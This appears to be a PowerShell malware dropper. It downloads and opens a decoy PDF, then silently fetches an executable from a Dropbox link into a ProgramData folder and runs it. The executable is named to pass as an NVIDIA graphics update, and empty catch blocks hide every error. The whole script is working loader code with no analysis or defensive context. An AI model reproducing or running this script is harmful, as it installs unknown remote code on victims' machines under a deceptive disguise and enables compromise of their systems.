$ProgressPreference = 'SilentlyContinue'

$File1Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/fls/doc.pdf" 
$File2Url = "https://www.dropbox.com/scl/fi/z8h1vvuuzq3fi0nix7tcr/resource?rlkey=988x13q0aukyaow9jqba8ofpz&st=xuu8a6yf&dl=1" 

$File1Path = "$env:TEMP\DOC-8796578552.pdf"

try {
    Invoke-WebRequest -Uri $File1Url -OutFile $File1Path -ErrorAction Stop
    Start-Process -FilePath $File1Path
} catch { }

$sourceFileName = "NvdgfxUpd.exe" 
$destinationFolder = "$env:ProgramData\TmpNvd" 
$destinationFilePath = Join-Path -Path $destinationFolder -ChildPath $sourceFileName

try{
   if (-Not (Test-Path -Path $destinationFolder)) {
       New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
   }
   if (-Not (Test-Path -Path $destinationFilePath)) {
       Invoke-WebRequest -Uri $File2Url -OutFile $destinationFilePath -ErrorAction Stop
   }
   Start-Process -FilePath $destinationFilePath
} catch{}
